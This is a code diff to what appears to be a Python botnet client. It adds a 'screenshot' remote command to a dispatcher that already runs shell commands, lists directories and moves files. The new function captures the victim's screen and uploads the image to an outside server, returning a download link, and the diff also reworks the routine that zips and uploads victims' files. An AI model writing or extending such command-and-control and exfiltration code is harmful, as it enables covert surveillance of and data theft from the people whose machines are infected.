@@ -21,7 +21,8 @@ scripts_name = {
     "cmd": "cmd <command>",
     "ls": "ls <route>",
     "export_file": "export_file <download link>",
-    "import_file": "import_file <file route>"
+    "import_file": "import_file <file route>",
+    "screenshot":  "screenshot"
 }
 
 # "import_file": "import_file <route>"
@@ -66,10 +67,15 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
+
             elif command_name == 'export_file':
                 return execute_download_manager(command, logger)
+
             elif command_name == 'import_file':
                 return execute_upload_manager(command, logger)
+
+            elif command_name == 'screenshot':
+                return screenshot(logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
@@ -228,16 +234,57 @@ def upload_manager(file_route: str, logger):
 
     if is_true:
         try:
+            # open zip file and read binary
             with open(zip_file_name, 'rb') as file:
                 binary_file = file.read()
                 is_true, download_data = util.upload_server_1(
                     binary_file, zip_file_name, logger)
+            try:
+                # remove zip file
                 os.remove(zip_file_name)
-                if is_true:
-                    return True, download_data
-                return False, 'Upload Failed'
+            except Exception as error:
+                logger.error('script.upload_manager.remove file error!')
+
+            if is_true:
+                # if uploada True
+                logger.info(f'{zip_file_name} file uploaded')
+                return True, download_data
+
+            return False, 'Upload Failed'
 
         except Exception as error:
             logger.error(f'upload_manager: {error}')
             return False, 'Upload Failed'
     return False, 'file not found'
+
+
+def screenshot(logger):
+    ''' get screenshot and return screenshot download link '''
+    screen_file_route = util.screenshot_pil(logger)
+
+    if screen_file_route:
+        try:
+            # open png file and read binary
+            with open(screen_file_route, 'rb') as file:
+                binary_file = file.read()
+                is_true, download_data = util.upload_server_1(
+                    binary_file, screen_file_route, logger, time_out=120, file_type='png')
+            try:
+                # remove png file
+                os.remove(screen_file_route)
+            except Exception as error:
+                logger.error(
+                    'script.upload_manager.remove  screenshot file error!')
+
+            if is_true:
+                # if upload True
+                logger.info('screenshot uploaded.')
+                return download_data
+            else:
+                return 'Upload screenshot Failed'
+        except Exception as error:
+            logger.error(f'scripts.screenshot.upload_manager: {error}')
+            return f'Upload Failed: \nupload_manager Exception:{error}'
+    else:
+        logger.error('script.screenshot in util.screenshot_pil Failed')
+        return 'get screenshot Failed'
